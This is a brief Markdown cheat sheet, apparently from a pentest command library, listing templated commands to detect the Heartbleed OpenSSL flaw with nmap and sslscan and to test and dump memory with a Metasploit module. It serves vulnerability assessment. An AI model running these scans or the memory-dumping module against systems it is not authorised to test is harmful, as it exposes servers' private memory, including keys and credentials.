# Heartbleed

> CVE-2014-0160 - OpenSSL Heartbeat extension memory disclosure

<!-- tags: heartbleed,cve-2014-0160,ssl,openssl -->

---

## Nmap Heartbleed Scan
Use the ssl-heartbleed NSE script for detection.

```bash
nmap -p {{PORT:port:443}} --script=ssl-heartbleed {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=vuln | tags=nmap,nse -->

---

## sslscan Bulk Heartbleed Check
Scan many hosts from a target list with sslscan.

```bash
sslscan --targets={{TARGETS:file:/tmp/targets.lst}} --no-ciphersuites --no-fallback --no-renegotiation --no-compression --no-check-certificate
```

<!-- meta: risk=safe | phase=vuln | tags=sslscan,bulk -->

---

## Build Targets List from URL List
Extract HTTPS hosts from URLs to feed sslscan.

```bash
grep https {{INFILE:file:urls.txt}} | cut -d '/' -f 3 | sort -u > {{OUTFILE:file:/tmp/targets.lst}}
```

<!-- meta: risk=safe | phase=vuln | tags=prep -->

---

## Metasploit Heartbleed Check
Use Metasploit auxiliary to test and dump.

```bash
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {{TARGET:ip}}; set VERBOSE true; run; exit"
```

<!-- meta: risk=med | phase=vuln | tags=metasploit -->
